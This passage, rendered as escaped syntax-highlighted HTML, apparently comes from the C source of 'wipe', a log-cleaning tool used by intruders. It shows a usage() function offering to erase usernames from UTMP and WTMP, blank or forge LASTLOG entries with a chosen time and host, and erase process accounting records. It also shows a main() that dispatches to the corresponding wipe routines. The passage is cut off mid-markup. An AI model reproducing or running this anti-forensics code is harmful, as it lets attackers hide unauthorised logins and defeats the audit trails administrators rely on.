class=\"p\"\u003e}\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003eusage\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;USAGE: wipe [ u|w|l|a ] ...options...\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;UTMP editing:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;    Erase all usernames      :   wipe u [username]\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;    Erase one username on tty:   wipe u [username] [tty]\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;WTMP editing:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;   Erase last entry for user :   wipe w [username]\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;   Erase last entry on tty   :   wipe w [username] [tty]\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;LASTLOG editing:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;   Blank lastlog for user    :   wipe l [username]\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;   Alter lastlog entry       :   wipe l [username] [tty] [time] [host]\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\tWhere [time] is in the format [YYMMddhhmm]\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef NO_ACCT\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;ACCT editing:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;   Erase acct entries on tty :   wipe a [username] [tty]\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\t\u003cspan class=\"nf\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003eargc\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003echar\u003c/span\u003e\t\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003eusage\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * First character of first argument determines which file to edit.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003etoupper\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * UTMP editing.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eswitch\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"cm\"\u003e/* UTMP */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"sc\"\u003e\u0026#39;U\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_utmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_utmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef HAVE_UTMPX\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_utmpx\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_utmpx\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\t\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"cm\"\u003e/* WTMP */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"sc\"\u003e\u0026#39;W\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_wtmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_wtmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef HAVE_UTMPX\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_wtmpx\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_wtmpx\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\t\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"cm\"\u003e/* LASTLOG */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"sc\"\u003e\u0026#39;L\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_lastlog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan 